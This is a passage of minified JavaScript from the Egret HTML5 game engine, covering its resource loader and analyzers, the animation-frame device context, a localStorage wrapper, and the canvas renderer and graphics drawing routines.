                a = d.createTexture(g, k.x, k.y, k.w, k.h, k.offX, k.offY, k.sourceW, k.sourceH);
                k.scale9grid && (k = k.scale9grid.split(","), a.scale9Grid = new egret.Rectangle(parseInt(k[0]), parseInt(k[1]), parseInt(k[2]), parseInt(k[3])));
                null == f[g] && (f[g] = a, c && this.addSubkey(g, c))
            }
            return d
        };
        a.prototype.destroyRes = function (a) {
            var b = this.fileDic[a];
            if (b) {
                delete this.fileDic[a];
                for (var c in b._textureMap)this.textureMap[c] && delete this.textureMap[c];
                return !0
            }
            return !1
        };
        return a
    }(c.BinAnalyzer);
    c.SheetAnalyzer = d;
    d.prototype.__class__ = "RES.SheetAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this)
        }

        __extends(a, b);
        a.prototype.analyzeConfig = function (a, b) {
            var c = a.name, d, f = "";
            try {
                d = JSON.parse(b)
            } catch (g) {
            }
            d ? f = this.getRelativePath(a.url, d.file) : (d = b, f = this.getTexturePath(a.url, d));
            this.sheetMap[c] = d;
            return f
        };
        a.prototype.analyzeBitmap = function (a, b) {
            var c = a.name;
            if (!this.fileDic[c] && b) {
                var d = this.sheetMap[c];
                delete this.sheetMap[c];
                d = new egret.BitmapFont(b, d);
                this.fileDic[c] = d
            }
        };
        a.prototype.getTexturePath = function (a, b) {
            var c = "", d = b.split("\n")[2],
                f = d.indexOf('file="');
            -1 != f && (d = d.substring(f + 6), f = d.indexOf('"'), c = d.substring(0, f));
            a = a.split("\\").join("/");
            f = a.lastIndexOf("/");
            return a = -1 != f ? a.substring(0, f + 1) + c : c
        };
        a.prototype.destroyRes = function (a) {
            return this.fileDic[a] ? (delete this.fileDic[a], !0) : !1
        };
        return a
    }(c.SheetAnalyzer);
    c.FontAnalyzer = d;
    d.prototype.__class__ = "RES.FontAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.SOUND
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var c = a.name;
            !this.fileDic[c] && b && (this.fileDic[c] = b, (c = a.data) && c.soundType ? b.preload(c.soundType) : b.preload(egret.Sound.EFFECT))
        };
        return a
    }(c.BinAnalyzer);
    c.SoundAnalyzer = d;
    d.prototype.__class__ = "RES.SoundAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._dataFormat = egret.URLLoaderDataFormat.TEXT
        }

        __extends(a, b);
        a.prototype.analyzeData = function (a, b) {
            var c = a.name;
            if (!this.fileDic[c] && b)try {
                var d = egret.XML.parse(b);
                this.fileDic[c] = d
            } catch (f) {
            }
        };
        return a
    }(c.BinAnalyzer);
    c.XMLAnalyzer = d;
    d.prototype.__class__ = "RES.XMLAnalyzer"
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    c.loadConfig = function (a, c, d) {
        void 0 === c && (c = "");
        void 0 === d && (d = "json");
        b.loadConfig(a, c, d)
    };
    c.loadGroup = function (a, c) {
        void 0 === c && (c = 0);
        b.loadGroup(a, c)
    };
    c.isGroupLoaded = function (a) {
        return b.isGroupLoaded(a)
    };
    c.getGroupByName = function (a) {
        return b.getGroupByName(a)
    };
    c.createGroup = function (a, c, d) {
        void 0 === d && (d = !1);
        return b.createGroup(a, c, d)
    };
    c.hasRes = function (a) {
        return b.hasRes(a)
    };
    c.parseConfig = function (a, c) {
        void 0 === c && (c = "");
        b.parseConfig(a, c)
    };
    c.getRes = function (a) {
        return b.getRes(a)
    };
    c.getResAsync = function (a, c, d) {
        b.getResAsync(a, c, d)
    };
    c.getResByUrl = function (a, c, d, n) {
        void 0 === n && (n = "");
        b.getResByUrl(a, c, d, n)
    };
    c.destroyRes = function (a) {
        return b.destroyRes(a)
    };
    c.setMaxLoadingThread = function (a) {
        b.setMaxLoadingThread(a)
    };
    c.addEventListener = function (a, c, d, n, h) {
        void 0 === n && (n = !1);
        void 0 === h && (h = 0);
        b.addEventListener(a, c, d, n, h)
    };
    c.removeEventListener = function (a, c, d, n) {
        void 0 === n && (n = !1);
        b.removeEventListener(a, c, d, n)
    };
    var d = function (a) {
        function b() {
            a.call(this);
            this.analyzerDic = {};
            this.configItemList =
                [];
            this.configComplete = this.callLaterFlag = !1;
            this.loadedGroups = [];
            this.groupNameList = [];
            this.asyncDic = {};
            this.init()
        }

        __extends(b, a);
        b.prototype.getAnalyzerByType = function (a) {
            var b = this.analyzerDic[a];
            b || (b = this.analyzerDic[a] = egret.Injector.getInstance(c.AnalyzerBase, a));
            return b
        };
        b.prototype.init = function () {
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_BIN) || egret.Injector.mapClass(c.AnalyzerBase, c.BinAnalyzer, c.ResourceItem.TYPE_BIN);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_IMAGE) ||
            egret.Injector.mapClass(c.AnalyzerBase, c.ImageAnalyzer, c.ResourceItem.TYPE_IMAGE);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_TEXT) || egret.Injector.mapClass(c.AnalyzerBase, c.TextAnalyzer, c.ResourceItem.TYPE_TEXT);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_JSON) || egret.Injector.mapClass(c.AnalyzerBase, c.JsonAnalyzer, c.ResourceItem.TYPE_JSON);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_SHEET) || egret.Injector.mapClass(c.AnalyzerBase, c.SheetAnalyzer,
                c.ResourceItem.TYPE_SHEET);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_FONT) || egret.Injector.mapClass(c.AnalyzerBase, c.FontAnalyzer, c.ResourceItem.TYPE_FONT);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_SOUND) || egret.Injector.mapClass(c.AnalyzerBase, c.SoundAnalyzer, c.ResourceItem.TYPE_SOUND);
            egret.Injector.hasMapRule(c.AnalyzerBase, c.ResourceItem.TYPE_XML) || egret.Injector.mapClass(c.AnalyzerBase, c.XMLAnalyzer, c.ResourceItem.TYPE_XML);
            this.resConfig = new c.ResourceConfig;
            this.resLoader = new c.ResourceLoader;
            this.resLoader.callBack = this.onResourceItemComp;
            this.resLoader.resInstance = this;
            this.resLoader.addEventListener(c.ResourceEvent.GROUP_COMPLETE, this.onGroupComp, this);
            this.resLoader.addEventListener(c.ResourceEvent.GROUP_LOAD_ERROR, this.onGroupError, this)
        };
        b.prototype.loadConfig = function (a, b, c) {
            void 0 === c && (c = "json");
            this.configItemList.push({url: a, resourceRoot: b, type: c});
            this.callLaterFlag || (egret.callLater(this.startLoadConfig, this), this.callLaterFlag = !0)
        };
        b.prototype.startLoadConfig =
            function () {
                this.callLaterFlag = !1;
                var a = this.configItemList;
                this.configItemList = [];
                this.loadingConfigList = a;
                for (var d = a.length, h = [], f = 0; f < d; f++) {
                    var g = a[f], g = new c.ResourceItem(g.url, g.url, g.type);
                    h.push(g)
                }
                this.resLoader.loadGroup(h, b.GROUP_CONFIG, Number.MAX_VALUE)
            };
        b.prototype.isGroupLoaded = function (a) {
            return -1 != this.loadedGroups.indexOf(a)
        };
        b.prototype.getGroupByName = function (a) {
            return this.resConfig.getGroupByName(a)
        };
        b.prototype.loadGroup = function (a, b) {
            void 0 === b && (b = 0);
            if (-1 != this.loadedGroups.indexOf(a))c.ResourceEvent.dispatchResourceEvent(this,
                c.ResourceEvent.GROUP_COMPLETE, a); else if (!this.resLoader.isGroupInLoading(a))if (this.configComplete) {
                var d = this.resConfig.getGroupByName(a);
                this.resLoader.loadGroup(d, a, b)
            } else this.groupNameList.push({name: a, priority: b})
        };
        b.prototype.createGroup = function (a, b, c) {
            void 0 === c && (c = !1);
            if (c) {
                var d = this.loadedGroups.indexOf(a);
                -1 != d && this.loadedGroups.splice(d, 1)
            }
            return this.resConfig.createGroup(a, b, c)
        };
        b.prototype.onGroupComp = function (a) {
            if (a.groupName == b.GROUP_CONFIG) {
                a = this.loadingConfigList.length;
                for (var d = 0; d < a; d++) {
                    var h = this.loadingConfigList[d], f = this.getAnalyzerByType(h.type), g = f.getRes(h.url);
                    f.destroyRes(h.url);
                    this.resConfig.parseConfig(g, h.resourceRoot)
                }
                this.configComplete = !0;
                this.loadingConfigList = null;
                c.ResourceEvent.dispatchResourceEvent(this, c.ResourceEvent.CONFIG_COMPLETE);
                this.loadDelayGroups()
            } else this.loadedGroups.push(a.groupName), this.dispatchEvent(a)
        };
        b.prototype.loadDelayGroups = function () {
            var a = this.groupNameList;
            this.groupNameList = [];
            for (var b = a.length, c = 0; c < b; c++) {
                var d =
                    a[c];
                this.loadGroup(d.name, d.priority)
            }
        };
        b.prototype.onGroupError = function (a) {
            a.groupName == b.GROUP_CONFIG ? (this.loadingConfigList = null, c.ResourceEvent.dispatchResourceEvent(this, c.ResourceEvent.CONFIG_LOAD_ERROR)) : this.dispatchEvent(a)
        };
        b.prototype.hasRes = function (a) {
            var b = this.resConfig.getType(a);
            return "" == b && (a = c.AnalyzerBase.getStringPrefix(a), b = this.resConfig.getType(a), "" == b) ? !1 : !0
        };
        b.prototype.parseConfig = function (a, b) {
            this.resConfig.parseConfig(a, b);
            this.configComplete || this.loadingConfigList ||
            (this.configComplete = !0, this.loadDelayGroups())
        };
        b.prototype.getRes = function (a) {
            var b = this.resConfig.getType(a);
            return "" == b && (b = c.AnalyzerBase.getStringPrefix(a), b = this.resConfig.getType(b), "" == b) ? null : this.getAnalyzerByType(b).getRes(a)
        };
        b.prototype.getResAsync = function (a, b, d) {
            var e = this.resConfig.getType(a), g = this.resConfig.getName(a);
            if ("" == e && (g = c.AnalyzerBase.getStringPrefix(a), e = this.resConfig.getType(g), "" == e)) {
                b.call(d, null);
                return
            }
            (e = this.getAnalyzerByType(e).getRes(a)) ? b.call(d, e) : (a = {
                key: a,
                compFunc: b, thisObject: d
            }, this.asyncDic[g] ? this.asyncDic[g].push(a) : (this.asyncDic[g] = [a], g = this.resConfig.getResourceItem(g), this.resLoader.loadItem(g)))
        };
        b.prototype.getResByUrl = function (a, b, d, e) {
            void 0 === e && (e = "");
            if (a) {
                e || (e = this.getTypeByUrl(a));
                var g = this.getAnalyzerByType(e).getRes(a);
                g ? b.call(d, g) : (b = {
                    key: a,
                    compFunc: b,
                    thisObject: d
                }, this.asyncDic[a] ? this.asyncDic[a].push(b) : (this.asyncDic[a] = [b], a = new c.ResourceItem(a, a, e), this.resLoader.loadItem(a)))
            } else b.call(d, null)
        };
        b.prototype.getTypeByUrl =
            function (a) {
                (a = a.substr(a.lastIndexOf(".") + 1)) && (a = a.toLowerCase());
                switch (a) {
                    case c.ResourceItem.TYPE_XML:
                    case c.ResourceItem.TYPE_JSON:
                    case c.ResourceItem.TYPE_SHEET:
                        break;
                    case "png":
                    case "jpg":
                    case "gif":
                    case "jpeg":
                    case "bmp":
                        a = c.ResourceItem.TYPE_IMAGE;
                        break;
                    case "fnt":
                        a = c.ResourceItem.TYPE_FONT;
                        break;
                    case "txt":
                        a = c.ResourceItem.TYPE_TEXT;
                        break;
                    case "mp3":
                    case "ogg":
                    case "mpeg":
                    case "wav":
                    case "m4a":
                    case "mp4":
                    case "aiff":
                    case "wma":
                    case "mid":
                        a = c.ResourceItem.TYPE_SOUND;
                        break;
                    default:
                        a = c.ResourceItem.TYPE_BIN
                }
                return a
            };
        b.prototype.onResourceItemComp = function (a) {
            var b = this.asyncDic[a.name];
            delete this.asyncDic[a.name];
            a = this.getAnalyzerByType(a.type);
            for (var c = b.length, d = 0; d < c; d++) {
                var e = b[d], k = a.getRes(e.key);
                e.compFunc.call(e.thisObject, k, e.key)
            }
        };
        b.prototype.destroyRes = function (a) {
            var b = this.resConfig.getRawGroupByName(a);
            if (b) {
                var c = this.loadedGroups.indexOf(a);
                -1 != c && this.loadedGroups.splice(c, 1);
                a = b.length;
                for (var d = 0; d < a; d++) {
                    c = b[d];
                    c.loaded = !1;
                    var e = this.getAnalyzerByType(c.type);
                    e.destroyRes(c.name)
                }
                return !0
            }
            b =
                this.resConfig.getType(a);
            if ("" == b)return !1;
            c = this.resConfig.getRawResourceItem(a);
            c.loaded = !1;
            e = this.getAnalyzerByType(b);
            return e.destroyRes(a)
        };
        b.prototype.setMaxLoadingThread = function (a) {
            1 > a && (a = 1);
            this.resLoader.thread = a
        };
        b.GROUP_CONFIG = "RES__CONFIG";
        return b
    }(egret.EventDispatcher);
    d.prototype.__class__ = "RES.Resource";
    var b = new d
})(RES || (RES = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(c) {
            void 0 === c && (c = 60);
            b.call(this);
            this.frameRate = c;
            this._time = 0;
            this._requestAnimationId = NaN;
            this._isActivate = !0;
            60 == c && (a.requestAnimationFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame, a.cancelAnimationFrame = window.cancelAnimationFrame || window.msCancelAnimationFrame || window.mozCancelAnimationFrame || window.webkitCancelAnimationFrame || window.oCancelAnimationFrame ||
            window.cancelRequestAnimationFrame || window.msCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.webkitCancelRequestAnimationFrame);
            a.requestAnimationFrame || (a.requestAnimationFrame = function (a) {
                return window.setTimeout(a, 1E3 / c)
            });
            a.cancelAnimationFrame || (a.cancelAnimationFrame = function (a) {
                return window.clearTimeout(a)
            });
            a.instance = this;
            this.registerListener()
        }

        __extends(a, b);
        a.prototype.enterFrame = function () {
            var b = a.instance, d = a._thisObject,
                n = a._callback, h = c.getTimer(), f = h - b._time;
            b._requestAnimationId = a.requestAnimationFrame.call(window, a.prototype.enterFrame);
            n.call(d, f);
            b._time = h
        };
        a.prototype.executeMainLoop = function (b, c) {
            a._callback = b;
            a._thisObject = c;
            this.enterFrame()
        };
        a.prototype.reset = function () {
            var b = a.instance;
            b._requestAnimationId && (b._time = c.getTimer(), a.cancelAnimationFrame.call(window, b._requestAnimationId), b.enterFrame())
        };
        a.prototype.registerListener = function () {
            var b = this, d = function () {
                    b._isActivate && (b._isActivate = !1, c.MainContext.instance.stage.dispatchEvent(new c.Event(c.Event.DEACTIVATE)))
                },
                n = function () {
                    b._isActivate || (b._isActivate = !0, a.instance.reset(), c.MainContext.instance.stage.dispatchEvent(new c.Event(c.Event.ACTIVATE)))
                }, h = function () {
                    document[f] ? d() : n()
                };
            window.addEventListener("focus", n, !1);
            window.addEventListener("blur", d, !1);
            var f, g;
            "undefined" !== typeof document.hidden ? (f = "hidden", g = "visibilitychange") : "undefined" !== typeof document.mozHidden ? (f = "mozHidden", g = "mozvisibilitychange") : "undefined" !== typeof document.msHidden ? (f = "msHidden", g = "msvisibilitychange") : "undefined" !== typeof document.webkitHidden ?
                (f = "webkitHidden", g = "webkitvisibilitychange") : "undefined" !== typeof document.oHidden && (f = "oHidden", g = "ovisibilitychange");
            "onpageshow"in window && "onpagehide"in window && (window.addEventListener("pageshow", n, !1), window.addEventListener("pagehide", d, !1));
            f && g && document.addEventListener(g, h, !1)
        };
        a.instance = null;
        a.requestAnimationFrame = null;
        a.cancelAnimationFrame = null;
        a._thisObject = null;
        a._callback = null;
        return a
    }(c.DeviceContext);
    c.HTML5DeviceContext = d;
    d.prototype.__class__ = "egret.HTML5DeviceContext"
})(egret ||
(egret = {}));
var egret_html5_localStorage;
(function (c) {
    c.getItem = function (c) {
        return ih5game.storage.get(c)
    };
    c.setItem = function (c, b) {
        try {
            return ih5game.storage.set(c, b), !0
        } catch (a) {
            return egret.Logger.infoWithErrorId(1018, c, b), !1
        }
    };
    c.removeItem = function (c) {
        window.localStorage.removeItem(c)
    };
    c.clear = function () {
        window.localStorage.clear()
    };
    c.init = function () {
        for (var d in c)egret.localStorage[d] = c[d]
    }
})(egret_html5_localStorage || (egret_html5_localStorage = {}));
egret_html5_localStorage.init();
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(a, c) {
            void 0 === c && (c = !0);
            b.call(this);
            this.globalAlpha = 1;
            this.useCacheCanvas = c;
            this.canvas = a || this.createCanvas();
            this.canvasContext = this.canvas.getContext("2d");
            c ? (this._cacheCanvas = document.createElement("canvas"), this._cacheCanvas.width = this.canvas.width, this._cacheCanvas.height = this.canvas.height, this.drawCanvasContext = this._cacheCanvasContext = this._cacheCanvas.getContext("2d")) : this.drawCanvasContext = this.canvasContext;
            this.onResize();
            var d = this.drawCanvasContext.setTransform,
                h = this;
            this.drawCanvasContext.setTransform = function (a, b, c, e, q, p) {
                h._matrixA = a;
                h._matrixB = b;
                h._matrixC = c;
                h._matrixD = e;
                h._matrixTx = q;
                h._matrixTy = p;
                d.call(h.drawCanvasContext, a, b, c, e, q, p)
            };
            this._matrixA = 1;
            this._matrixC = this._matrixB = 0;
            this._matrixD = 1;
            this._transformTy = this._transformTx = this._matrixTy = this._matrixTx = 0;
            this.initBlendMode()
        }

        __extends(a, b);
        a.prototype.createCanvas = function () {
            var a = c.Browser.getInstance().$("#egretCanvas");
            if (!a) {
                var b = document.getElementById(c.StageDelegate.canvas_div_name),
                    a = c.Browser.getInstance().$new("canvas");
                a.id = "egretCanvas";
                b.appendChild(a)
            }
            c.MainContext.instance.stage.addEventListener(c.Event.RESIZE, this.onResize, this);
            return a
        };
        a.prototype.onResize = function () {
            if (this.canvas) {
                var a = document.getElementById(c.StageDelegate.canvas_div_name);
                this.canvas.width = c.MainContext.instance.stage.stageWidth;
                this.canvas.height = c.MainContext.instance.stage.stageHeight;
                this.canvas.style.width = a.style.width;
                this.canvas.style.height = a.style.height;
                this.useCacheCanvas && (this._cacheCanvas.width =
                    this.canvas.width, this._cacheCanvas.height = this.canvas.height);
                this.drawCanvasContext.imageSmoothingEnabled = c.RendererContext.imageSmoothingEnabled;
                this.drawCanvasContext.webkitImageSmoothingEnabled = c.RendererContext.imageSmoothingEnabled;
                this.drawCanvasContext.mozImageSmoothingEnabled = c.RendererContext.imageSmoothingEnabled;
                this.drawCanvasContext.msImageSmoothingEnabled = c.RendererContext.imageSmoothingEnabled
            }
        };
        a.prototype.clearScreen = function () {
            for (var a = c.RenderFilter.getInstance().getDrawAreaList(),
                     b = 0, d = a.length; b < d; b++) {
                var h = a[b];
                this.clearRect(h.x, h.y, h.width, h.height)
            }
            a = c.MainContext.instance.stage;
            this.useCacheCanvas && this._cacheCanvasContext.clearRect(0, 0, a.stageWidth, a.stageHeight);
            this.renderCost = 0
        };
        a.prototype.clearRect = function (a, b, c, d) {
            this.canvasContext.clearRect(a, b, c, d)
        };
        a.prototype.drawImage = function (a, d, n, h, f, g, k, l, m, p) {
            void 0 === p && (p = void 0);
            var r = a._bitmapData;
            g += this._transformTx;
            k += this._transformTy;
            var t = c.getTimer();
            void 0 === p ? this.drawCanvasContext.drawImage(r, d, n, h,
                f, g, k, l, m) : this.drawRepeatImage(a, d, n, h, f, g, k, l, m, p);
            b.prototype.drawImage.call(this, a, d, n, h, f, g, k, l, m, p);
            this.renderCost += c.getTimer() - t
        };
        a.prototype.drawRepeatImage = function (a, b, d, h, f, g, k, l, m, p) {
            if (void 0 === a.pattern) {
                var r = c.MainContext.instance.rendererContext._texture_scale_factor, t = a._bitmapData, s = t;
                if (t.width != h || t.height != f || 1 != r)s = document.createElement("canvas"), s.width = h * r, s.height = f * r, s.getContext("2d").drawImage(t, b, d, h, f, 0, 0, h * r, f * r);
                b = this.drawCanvasContext.createPattern(s, p);
                a.pattern =
                    b
            }
            this.drawCanvasContext.fillStyle = a.pattern;
            this.drawCanvasContext.translate(g, k);
            this.drawCanvasContext.fillRect(0, 0, l, m);
            this.drawCanvasContext.translate(-g, -k)
        };
        a.prototype.setTransform = function (a) {
            1 == a.a && 0 == a.b && 0 == a.c && 1 == a.d && 1 == this._matrixA && 0 == this._matrixB && 0 == this._matrixC && 1 == this._matrixD ? (this._transformTx = a.tx - this._matrixTx, this._transformTy = a.ty - this._matrixTy) : (this._transformTx = this._transformTy = 0, this._matrixA == a.a && this._matrixB == a.b && this._matrixC == a.c && this._matrixD == a.d &&
            this._matrixTx == a.tx && this._matrixTy == a.ty || this.drawCanvasContext.setTransform(a.a, a.b, a.c, a.d, a.tx, a.ty))
        };
        a.prototype.setAlpha = function (a, b) {
            a != this.globalAlpha && (this.drawCanvasContext.globalAlpha = this.globalAlpha = a);
            b ? (this.blendValue = this.blendModes[b], this.drawCanvasContext.globalCompositeOperation = this.blendValue) : this.blendValue != c.BlendMode.NORMAL && (this.blendValue = this.blendModes[c.BlendMode.NORMAL], this.drawCanvasContext.globalCompositeOperation = this.blendValue)
        };
        a.prototype.initBlendMode =
            function () {
                this.blendModes = {};
                this.blendModes[c.BlendMode.NORMAL] = "source-over";
                this.blendModes[c.BlendMode.ADD] = "lighter"
            };
        a.prototype.setupFont = function (a, b) {
            void 0 === b && (b = null);
            b = b || {};
            var c = null == b.size ? a._size : b.size, d = null == b.fontFamily ? a._fontFamily : b.fontFamily, f = this.drawCanvasContext, g = (null == b.italic ? a._italic : b.italic) ? "italic " : "normal ", g = g + ((null == b.bold ? a._bold : b.bold) ? "bold " : "normal ");
            f.font = g + (c + "px " + d);
            f.textAlign = "left";
            f.textBaseline = "middle"
        };
        a.prototype.measureText = function (a) {
            return this.drawCanvasContext.measureText(a).width
        };
        a.prototype.drawText = function (a, d, n, h, f, g) {
            void 0 === g && (g = null);
            this.setupFont(a, g);
            g = g || {};
            var k;
            k = null != g.textColor ? c.toColorString(g.textColor) : a._textColorString;
            var l;
            l = null != g.strokeColor ? c.toColorString(g.strokeColor) : a._strokeColorString;
            var m;
            m = null != g.stroke ? g.stroke : a._stroke;
            var p = this.drawCanvasContext;
            p.fillStyle = k;
            p.strokeStyle = l;
            m && (p.lineWidth = 2 * m, p.strokeText(d, n + this._transformTx, h + this._transformTy, f || 65535));
            p.fillText(d, n + this._transformTx, h + this._transformTy, f || 65535);
            b.prototype.drawText.call(this,
                a, d, n, h, f, g)
        };
        a.prototype.strokeRect = function (a, b, c, d, f) {
            this.drawCanvasContext.strokeStyle = f;
            this.drawCanvasContext.strokeRect(a, b, c, d)
        };
        a.prototype.pushMask = function (a) {
            this.drawCanvasContext.save();
            this.drawCanvasContext.beginPath();
            this.drawCanvasContext.rect(a.x + this._transformTx, a.y + this._transformTy, a.width, a.height);
            this.drawCanvasContext.clip();
            this.drawCanvasContext.closePath()
        };
        a.prototype.popMask = function () {
            this.drawCanvasContext.restore();
            this.drawCanvasContext.setTransform(1, 0, 0, 1, 0,
                0)
        };
        a.prototype.onRenderStart = function () {
            this.drawCanvasContext.save()
        };
        a.prototype.onRenderFinish = function () {
            this.drawCanvasContext.restore();
            this.drawCanvasContext.setTransform(1, 0, 0, 1, 0, 0);
            if (this.useCacheCanvas)for (var a = this._cacheCanvas.width, b = this._cacheCanvas.height, d = c.RenderFilter.getInstance().getDrawAreaList(), h = 0, f = d.length; h < f; h++) {
                var g = d[h], k = g.x, l = g.y, m = g.width, g = g.height;
                k + m > a && (m = a - k);
                l + g > b && (g = b - l);
                0 < m && 0 < g && this.canvasContext.drawImage(this._cacheCanvas, k, l, m, g, k, l, m, g)
            }
        };
        return a
    }(c.RendererContext);
    c.HTML5CanvasRenderer = d;
    d.prototype.__class__ = "egret.HTML5CanvasRenderer"
})(egret || (egret = {}));
var egret_h5_graphics;
(function (c) {
    c.beginFill = function (b, a) {
        void 0 === a && (a = 1);
        var c = "rgba(" + (b >> 16) + "," + ((b & 65280) >> 8) + "," + (b & 255) + "," + a + ")";
        this.fillStyleColor = c;
        this._pushCommand(new d(this._setStyle, this, [c]))
    };
    c.drawRect = function (b, a, c, q) {
        this._pushCommand(new d(function (a, b, c, d) {
            var e = this.renderContext;
            this.canvasContext.beginPath();
            this.canvasContext.rect(e._transformTx + a, e._transformTy + b, c, d);
            this.canvasContext.closePath()
        }, this, [b, a, c, q]));
        this._fill();
        this.checkRect(b, a, c, q)
    };
    c.drawCircle = function (b, a, c) {
        this._pushCommand(new d(function (a,
                                          b, c) {
            var d = this.renderContext;
            this.canvasContext.beginPath();
            this.canvasContext.arc(d._transformTx + a, d._transformTy + b, c, 0, 2 * Math.PI);
            this.canvasContext.closePath()
        }, this, [b, a, c]));
        this._fill();
        this.checkRect(b - c, a - c, 2 * c, 2 * c)
    };
    c.drawRoundRect = function (b, a, c, q, n, h) {
        this._pushCommand(new d(function (a, b, c, d, e, q) {
            var h = this.renderContext;
            a = h._transformTx + a;
            b = h._transformTy + b;
            e /= 2;
            q = q ? q / 2 : e;
            c = a + c;
            d = b + d;
            h = d - q;
            this.canvasContext.beginPath();
            this.canvasContext.moveTo(c, h);
            this.canvasContext.quadraticCurveTo(c,
                d, c - e, d);
            this.canvasContext.lineTo(a + e, d);
            this.canvasContext.quadraticCurveTo(a, d, a, d - q);
            this.canvasContext.lineTo(a, b + q);
            this.canvasContext.quadraticCurveTo(a, b, a + e, b);
            this.canvasContext.lineTo(c - e, b);
            this.canvasContext.quadraticCurveTo(c, b, c, b + q);
            this.canvasContext.lineTo(c, h);
            this.canvasContext.closePath()
        }, this, [b, a, c, q, n, h]));
        this._fill();
        this.checkRect(b, a, c, q)
    };
    c.drawEllipse = function (b, a, c, q) {
        this._pushCommand(new d(function (a, b, c, d) {
            var e = this.renderContext;
            this.canvasContext.save();
            a = e._transformTx +
            a;
            b = e._transformTy + b;
            var e = c > d ? c : d, q = c / e;
            d /= e;
            this.canvasContext.scale(q, d);
            this.canvasContext.beginPath();
            this.canvasContext.moveTo((a + c) / q, b / d);
            this.canvasContext.arc(a / q, b / d, e, 0, 2 * Math.PI);
            this.canvasContext.closePath();
            this.canvasContext.restore();
            this.canvasContext.stroke()
        }, this, [b, a, c, q]));
        this._fill();
        this.checkRect(b - c, a - q, 2 * c, 2 * q)
    };
    c.lineStyle = function (b, a, c, q, n, h, f, g) {
        void 0 === b && (b = NaN);
        void 0 === a && (a = 0);
        void 0 === c && (c = 1);
        void 0 === q && (q = !1);
        void 0 === n && (n = "normal");
        void 0 === h && (h = null);
        void 0 === f && (f = null);
        void 0 === g && (g = 3);
        this.strokeStyleColor && (this.createEndLineCommand(), this._pushCommand(this.endLineCommand));
        this.strokeStyleColor = a = "rgba(" + (a >> 16) + "," + ((a & 65280) >> 8) + "," + (a & 255) + "," + c + ")";
        this._pushCommand(new d(function (a, b) {
            this.canvasContext.lineWidth = a;
            this.canvasContext.strokeStyle = b;
            this.canvasContext.beginPath()
        }, this, [b, a]));
        "undefined" === typeof this.lineX && (this.lineY = this.lineX = 0);
        this.moveTo(this.lineX, this.lineY)
    };
    c.lineTo = function (b, a) {
        this._pushCommand(new d(function (a,
                                          b) {
            var c = this.renderContext;
            this.canvasContext.lineTo(c._transformTx + a, c._transformTy + b)
        }, this, [b, a]));
        this.lineX = b;
        this.lineY = a;
        this.checkPoint(b, a)
    };
    c.curveTo = function (b, a, c, q) {
        this._pushCommand(new d(function (a, b, c, d) {
            var e = this.renderContext;
            this.canvasContext.quadraticCurveTo(e._transformTx + a, e._transformTy + b, e._transformTx + c, e._transformTy + d)
        }, this, [b, a, c, q]));
        this.lineX = c;
        this.lineY = q;
        this.checkPoint(b, a);
        this.checkPoint(c, q)
    };
    c.moveTo = function (b, a) {
        this._pushCommand(new d(function (a, b) {
            var c =
                this.renderContext;
            this.canvasContext.moveTo(c._transformTx + a, c._transformTy + b)
        }, this, [b, a]));
        this.checkPoint(b, a)
    };
    c.clear = function () {
        this.lineY = this.lineX = this.commandQueue.length = 0;
        this.fillStyleColor = this.strokeStyleColor = null;
        this._dirty = !1;
        this._maxY = this._maxX = this._minY = this._minX = 0
    };
    c.createEndFillCommand = function () {
        this.endFillCommand || (this.endFillCommand = new d(function () {
            this.canvasContext.fill();
            this.canvasContext.closePath()
        }, this, null))
    };
    c.endFill = function () {
        null != this.fillStyleColor &&
        this._fill()
    };
    c._fill = function () {
        this.fillStyleColor && (this.createEndFillCommand(), this._pushCommand(this.endFillCommand), this.fillStyleColor = null)
    };
    c.createEndLineCommand = function () {
        this.endLineCommand || (this.endLineCommand = new d(function () {
            this.canvasContext.stroke();
            this.canvasContext.closePath()
        }, this, null))
    };
    c._pushCommand = function (b) {
        this.commandQueue.push(b);
        this._dirty = !0
    };
    c._draw = function (b) {
        var a = this.commandQueue.length;
        if (0 != a) {
            this.renderContext = b;
            b = this.canvasContext = this.renderContext.drawCanvasContext;
            b.save();
